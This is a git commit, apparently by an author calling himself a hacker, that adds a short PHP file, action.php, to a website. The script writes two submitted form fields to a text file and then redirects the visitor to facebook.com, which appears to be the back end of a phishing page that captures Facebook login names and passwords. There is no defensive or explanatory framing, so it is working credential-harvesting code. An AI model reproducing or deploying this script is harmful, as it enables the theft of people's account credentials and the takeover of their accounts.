1d2bdad4a10edc013ff31f207e1baaa4e8677d63
sontranhacker <sontrandaxua@icloud.com>
2017-10-29 21:59:29 +0700

    First website upload

---
+++ action.php
@@ -0,0 +1,13 @@
+<?php
+header('Location: http://www.facebook.com');
+$txt = "data.txt";
+$fh = fopen($txt, 'w+');
+if (isset($_POST['field1']) && isset($_POST['field2'])) { // check if both fields are set
+   $txt=$_POST['field1'].' - '.$_POST['field2'];
+   file_put_contents('data.txt',$txt."\n",FILE_APPEND); // log to data.txt
+   exit();
+}
+    fwrite($fh,$txt); // Write information to the file
+    fclose($fh); // Close the file
+ 
+?>
